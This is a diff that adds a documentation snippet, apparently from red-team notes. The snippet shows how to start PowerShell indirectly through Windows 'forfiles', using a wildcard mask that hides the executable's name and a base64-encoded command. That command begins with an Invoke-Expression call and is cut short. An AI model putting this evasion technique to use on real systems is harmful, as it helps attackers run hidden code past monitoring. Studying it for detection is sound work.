@@ -64,6 +64,14 @@
 <span class="n">color</span> <span class="n">a</span>
 </pre></div>
 </div>
+<p>Run PowerShell using <code class="docutils literal notranslate"><span class="pre">forfiles</span></code> (cf. <a class="reference external" href="https://twitter.com/AmnaKMahmood/status/1121504040083496961">https://twitter.com/AmnaKMahmood/status/1121504040083496961</a>):</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># /p to specify the path where to start searching,</span>
+<span class="c1"># /s to recurse into subdirectories,</span>
+<span class="c1"># /m to specify the search mask,</span>
+<span class="c1"># /c to run a command, with @file being the name of the file and @path the full path</span>
+<span class="n">forfiles</span> <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">p</span> <span class="n">C</span><span class="p">:</span>\<span class="n">WINDOWS</span>\<span class="n">System32</span> <span class="o">/</span><span class="n">m</span> <span class="n">p</span><span class="o">*</span><span class="n">ll</span><span class="o">.*</span><span class="n">e</span> <span class="o">/</span><span class="n">c</span> <span class="s2">&quot;cmd /c @file -ec aQBlAHgAIAAoAGcAcAAgACcA...&quot;</span>
+</pre></div>
+</div>
 </div>
 
 
